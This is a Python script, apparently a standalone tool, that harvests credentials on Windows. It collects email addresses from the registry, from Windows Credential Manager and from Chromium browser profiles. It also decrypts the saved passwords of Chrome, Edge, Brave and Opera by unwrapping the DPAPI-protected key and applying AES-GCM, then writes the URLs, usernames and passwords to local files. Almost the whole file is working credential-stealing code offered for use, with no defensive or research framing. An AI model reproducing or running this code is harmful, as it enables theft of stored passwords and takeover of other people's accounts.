from enum import Enum
import sys
import re
import os
import json
import base64
# Windows registry
import winreg
# Windows credentials
import win32cred      # pywin32
import win32timezone  # pywin32
import win32crypt     # pywin32
# Chrome passwords
import sqlite3
from Cryptodome.Cipher import AES 



#   /$$$$$$  /$$           /$$                 /$$
#  /$$__  $$| $$          | $$                | $$
# | $$  \__/| $$  /$$$$$$ | $$$$$$$   /$$$$$$ | $$
# | $$ /$$$$| $$ /$$__  $$| $$__  $$ |____  $$| $$
# | $$|_  $$| $$| $$  \ $$| $$  \ $$  /$$$$$$$| $$
# | $$  \ $$| $$| $$  | $$| $$  | $$ /$$__  $$| $$
# |  $$$$$$/| $$|  $$$$$$/| $$$$$$$/|  $$$$$$$| $$
#  \______/ |__/ \______/ |_______/  \_______/|__/

# Settings
class Target(Enum):
  Mails = 0      # Mails
  Accounts = 1   # Usernames & passwords

class SaveAs(Enum):
  JSON = 0
  Text = 1

class Settings:
  targets = [ Target.Mails, Target.Accounts ]
  save = SaveAs.JSON

def searching(search):
  return search in Settings.targets

# Info & settings
class Info:
  mails = {}
  accounts = []







#   /$$$$$$                                                      /$$    
#  /$$__  $$                                                    | $$    
# | $$  \ $$  /$$$$$$$  /$$$$$$$  /$$$$$$  /$$   /$$ /$$$$$$$  /$$$$$$  
# | $$$$$$$$ /$$_____/ /$$_____/ /$$__  $$| $$  | $$| $$__  $$|_  $$_/  
# | $$__  $$| $$      | $$      | $$  \ $$| $$  | $$| $$  \ $$  | $$    
# | $$  | $$| $$      | $$      | $$  | $$| $$  | $$| $$  | $$  | $$ /$$
# | $$  | $$|  $$$$$$$|  $$$$$$$|  $$$$$$/|  $$$$$$/| $$  | $$  |  $$$$/
# |__/  |__/ \_______/ \_______/ \______/  \______/ |__/  |__/   \___/  

# Helpers
def addAccount(url, username, password):
  # Fix data
  url = str(url).replace('\r', '')
  username = str(username).replace('\r', '')
  password = str(password).replace('\r', '')

  # No user or password
  if username == '' or password == '': return

  # Add to list
  Info.accounts.append({
    'url': url,
    'username': username,
    'password': password
  })

# Search functions
def searchChromium():
  # Not searching for mails or accounts
  if searching(Target.Mails): 
    if searching(Target.Accounts):
      print('Searching chromium browsers for mails and accounts...')
    else:
      print('Searching chromium browsers for mails...')
  elif searching(Target.Accounts):
    print('Searching chromium browsers for accounts...')
  else:
    return
  
  # Get appdata folders
  local = os.getenv('LOCALAPPDATA')
  roaming = os.getenv('APPDATA')

  # Add mails from all known chromium browsers
  searchChromiumFromPath(local + '\\Google\\Chrome\\User Data\\')
  searchChromiumFromPath(local + '\\Microsoft\\Edge\\User Data\\')
  searchChromiumFromPath(local + '\\BraveSoftware\\Brave-Browser\\User Data\\')
  searchChromiumFromPath(roaming + '\\Opera Software\\Opera Stable\\User Data\\')
  searchChromiumFromPath(roaming + '\\Opera Software\\Opera GX Stable\\User Data\\')

def searchChromiumFromPath(path):
  # Find mail in chromium browser
  localStatePath = path + 'Local State'

  # Check if local state file exists
  if not os.path.exists(localStatePath): return

  # Read local state file
  localState = None
  try:
    # Read local state data (json)
    with open(localStatePath) as f:
      localState = json.load(f)
  except Exception as e:
    # Error -> Return
    print(f'Error reading local state data: {e}')
    return

  # Get profiles from local state
  if not 'profile' in localState: 
    print(f'Error reading local state profiles: {e}')
    return
  profile = localState['profile']
  if not 'profiles_order' in profile: 
    print(f'Error reading local state profiles: {e}')
    return
  profileNames = profile['profiles_order']
  if not 'info_cache' in profile: 
    print(f'Error reading local state profiles: {e}')
    return
  profilesData = profile['info_cache']

  # Get secret key to decrypt passwords
  secretKey = None
  if (searching(Target.Accounts)):
    try:
      # Get key from local state & decode it
      secretKey = localState['os_crypt']['encrypted_key']
      secretKey = base64.b64decode(secretKey)
      # Remove suffix DPAPI & decrypt it
      secretKey = secretKey[5:]
      secretKey = win32crypt.CryptUnprotectData(secretKey, None, None, None, 0)[1]
    except Exception as e:
      # Error
      print(f'Error finding encryption key: {e}')
  
  # Check profiles
  for name in profileNames:
    # Get profile data
    profileData = profilesData[name]

    # Get profile user name (mail)
    if searching(Target.Mails) and 'user_name' in profileData: 
      addMail(profileData['user_name'])

    # Get profile folder
    profileFolder = path + name + '\\'

    # Searching for mails -> Read preferences file
    if (searching(Target.Mails)):
      try:
        # Read file
        with open(profileFolder + 'Preferences') as f:
          # Parse preferences data (json)
          preferences = json.load(f)

          # Get accounts info
          if 'account_info' in preferences: 
            accounts = preferences['account_info']

            # Find mails in accounts
            for account in accounts:
              if 'email' in account:
                addMail(account['email'])
      except Exception as e:
        # Error
        print(f'Error reading preferences file: {e}')

    # Read login data file
    try:
      # Connect to database
      connection = sqlite3.connect(f'file:{profileFolder}Login Data?mode=ro&immutable=1', uri = True)

      # Select logins
      cursor = connection.cursor()
      cursor.execute('SELECT action_url, username_value, password_value FROM logins')
      
      # Loop usernames & save mails
      for row in cursor.fetchall():
        # Save mail
        if (searching(Target.Mails)):
          addMail(row[1])

        # Save account
        if (searching(Target.Accounts) and secretKey is not None):
          # Get ciphertext
          ciphertext = row[2]
          # Extract initialisation vector & encrypted password
          initialisation_vector = ciphertext[3:15]
          encrypted_password = ciphertext[15:-16]
          # Build the AES algorithm to decrypt the password
          cipher = AES.new(secretKey, AES.MODE_GCM, initialisation_vector)
          # Decrypt password and save account
          addAccount(row[0], row[1], cipher.decrypt(encrypted_password).decode())

      # Close database
      connection.close()
    except Exception as e:
      print(f'Error reading login data file: {e}')
        



#  /$$      /$$           /$$ /$$
# | $$$    /$$$          |__/| $$
# | $$$$  /$$$$  /$$$$$$  /$$| $$
# | $$ $$/$$ $$ |____  $$| $$| $$
# | $$  $$$| $$  /$$$$$$$| $$| $$
# | $$\  $ | $$ /$$__  $$| $$| $$
# | $$ \/  | $$|  $$$$$$$| $$| $$
# |__/     |__/ \_______/|__/|__/

# Helpers
def addMail(mail):
  # Fix data
  mail = str(mail).replace('\r', '')

  # Not a mail -> Return
  if (not isMail(mail)):
    return
  
  # Add to dictionary
  if mail in Info.mails:
    Info.mails[mail] += 1
  else:
    Info.mails[mail] = 1

def isMail(mail):
  pattern = re.compile(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$")
  return pattern.match(str(mail))

# Search functions
def searchMailInRegistry():
  # Not searching for mails
  if not searching(Target.Mails): return

  # Current method
  print('Searching registry for mails...')

  # Search the key path subkeys
  try:
    # Open the registry key
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\IdentityCRL\\UserExtendedProperties', 0, winreg.KEY_READ)
    
    # Add all folders to list
    i = 0
    while True:
      try:
        # Get next subkey & save it
        addMail(winreg.EnumKey(key, i))
        i += 1
      except OSError:
        # No more subkeys
        break

    # Close the registry key
    winreg.CloseKey(key)

  except FileNotFoundError:
    # Key does not exist
    print("Registry does not exist")

  except PermissionError:
    # Missing permissions to read the key
    print("Missing permissions to read the key")

def searchMailInCredentials():
  # Not searching for mails
  if not searching(Target.Mails): return

  # Current method
  print('Searching Windows credentials for mails...')

  # Look for mails in Windows credentials
  try:
    # Get all credentials
    credentials = win32cred.CredEnumerate(None, 0)
    
    # Check credentials for mails
    for cred in credentials:
      addMail(cred.get('UserName', 'N/A'))
  
  except Exception as e:
    # Error
    print(f"Error while reading credentials: {e}")



#  /$$      /$$           /$$          
# | $$$    /$$$          |__/          
# | $$$$  /$$$$  /$$$$$$  /$$ /$$$$$$$ 
# | $$ $$/$$ $$ |____  $$| $$| $$__  $$
# | $$  $$$| $$  /$$$$$$$| $$| $$  \ $$
# | $$\  $ | $$ /$$__  $$| $$| $$  | $$
# | $$ \/  | $$|  $$$$$$$| $$| $$  | $$
# |__/     |__/ \_______/|__/|__/  |__/

# Check arguments
for i, arg in enumerate(sys.argv):
  # Ignore first argument (is the file's path)
  if (i == 0): continue

  # Check if argument is to change a var
  if (not re.compile(r".+=.+").match(arg)): continue

  # Get variable & value
  parts = arg.split('=')
  var = parts[0]
  val = parts[1]

  # Check settings to change
  match var:
    # Target information
    case 't' | 'target' | 'targets':
      Settings.targets = []
      for target in val.split(','):
        match target.lower():
          case 'm' | 'mail' | 'mails':
            Settings.targets.append(Target.Mails)
          case 'a' | 'account' | 'accounts':
            Settings.targets.append(Target.Accounts)

    # Save format
    case 's' | 'save':
      match val.lower():
        case 't' | 'text' | 'txt':
          Settings.save = SaveAs.Text
        case 'j' | 'json' | _:
          Settings.save = SaveAs.JSON

# Search info
print('\n** SEARCHING FOR INFORMATION')
searchMailInRegistry()
searchMailInCredentials()
searchChromium()

# Save info to file
print('\n** SAVING INFORMATION')
match Settings.save:
  # Save as JSON
  case SaveAs.JSON:
    # Mails
    if (searching(Target.Mails)):
      print('Saving mails in mails.json')

      # Save file
      file = open('mails.json', 'w')
      json.dump(Info.mails, file)
      file.close()

    # Accounts
    if (searching(Target.Accounts)):
      print('Saving accounts in accounts.json')

      # Save file
      file = open('accounts.json', 'w')
      json.dump(Info.accounts, file)
      file.close()
    
  # Save as TXT
  case SaveAs.Text:
    # Mails
    if (searching(Target.Mails)):
      print('Saving mails in mails.txt')

      # Save file
      file = open('mails.txt', 'w')
      for i, mail in enumerate(Info.mails):
        file.write(mail + '\t' + str(Info.mails[mail]))
        if (i < len(Info.mails) - 1): 
          file.write('\n')
      file.close()
    
    # Accounts
    if (searching(Target.Accounts)):
      print('Saving accounts in accounts.txt')

      # Save file
      file = open('accounts.txt', 'w')
      for i, account in enumerate(Info.accounts):
        file.write(account['username'] + '\t' + account['password'] + '\t' + account['url'])
        if (i < len(Info.accounts) - 1): 
          file.write('\n')
      file.close()